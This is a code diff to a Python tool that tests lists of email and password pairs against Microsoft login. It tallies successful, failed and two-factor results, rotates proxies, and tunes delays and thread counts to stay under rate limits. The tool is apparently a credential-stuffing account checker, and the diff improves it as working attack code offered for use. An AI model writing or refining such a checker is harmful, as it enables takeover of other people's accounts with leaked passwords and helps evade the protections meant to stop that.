@@ -39,7 +39,7 @@ class StatusCounter:
         self.twofa = 0
         self.lock = threading.Lock()
         self.last_update = 0
-        self._display_status()  # Show initial status
+        self.first_print = True
         
     def update(self, status):
         with self.lock:
@@ -58,11 +58,13 @@ class StatusCounter:
             return
         self.last_update = current_time
         
-        # Move cursor up and clear line
-        sys.stdout.write('\033[F' if self.success + self.failed + self.twofa > 0 else '')  # Move up only if not first print
+        # Move cursor up and clear line if not first print
+        if not self.first_print:
+            sys.stdout.write('\033[F')  # Move up one line
+        else:
+            self.first_print = False
+            
         sys.stdout.write('\033[K')  # Clear line
-        
-        # Print status
         print(f"{Fore.GREEN}[SUCCESS] > {self.success}   {Fore.RED}[FAILED] > {self.failed}   {Fore.YELLOW}[2FA] > {self.twofa}{Style.RESET_ALL}")
         sys.stdout.flush()
 
@@ -350,7 +352,7 @@ def process_accounts_with_workers(filename, config):
     result_queue = queue.Queue()
     account_queue = queue.Queue()
     valid_accounts = []
-    proxy_manager = ProxyManager(config)
+    proxy_manager = ProxyManager(config) if config['proxy']['enabled'] else None
     status_counter = StatusCounter()
     
     # Fill account queue
@@ -365,7 +367,10 @@ def process_accounts_with_workers(filename, config):
                 except queue.Empty:
                     break
                 
-                proxy = proxy_manager.get_next_proxy() if proxy_manager.proxies else None
+                # Handle proxy based on config
+                proxy = None
+                if config['proxy']['enabled']:
+                    proxy = proxy_manager.get_next_proxy() if proxy_manager.proxies else None
                 
                 access_token = microsoft_login(email, password, proxy)
                 if access_token:
@@ -385,20 +390,34 @@ def process_accounts_with_workers(filename, config):
                 if config['authentication']['allowRetry'] and retries < config['authentication']['retryCount']:
                     account_queue.put(((email, password), retries + 1))
                 else:
+                    # Only count as failed after all retries are exhausted
                     status_counter.update("FAILED")
                     save_locked_accounts(email, password)
                 
                 account_queue.task_done()
-                time.sleep(5)
+                
+                # Add delay if not using proxies
+                if not config['proxy']['enabled']:
+                    time.sleep(config['authNoProxy']['authDelay'])
+                else:
+                    time.sleep(5)  # Default proxy delay
                 
             except Exception as e:
                 if 'email' in locals():
-                    status_counter.update("FAILED")
+                    # Only count as failed if we're out of retries
+                    if not config['authentication']['allowRetry'] or retries >= config['authentication']['retryCount']:
+                        status_counter.update("FAILED")
                     save_locked_accounts(email, password)
                 account_queue.task_done()
+
+    # Adjust thread count based on proxy usage
+    max_threads = config['authentication']['threadCount']
+    if not config['proxy']['enabled']:
+        # Limit threads when not using proxies to prevent rate limiting
+        max_threads = min(max_threads, 3)
+        print(f"{Fore.YELLOW}Running with limited threads ({max_threads}) due to no proxy usage{Style.RESET_ALL}")
     
-    # Create and start worker threads based on config
-    thread_count = min(config['authentication']['threadCount'], len(accounts))
+    thread_count = min(max_threads, len(accounts))
     threads = []
     for _ in range(thread_count):
         thread = threading.Thread(target=worker)
@@ -458,4 +477,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
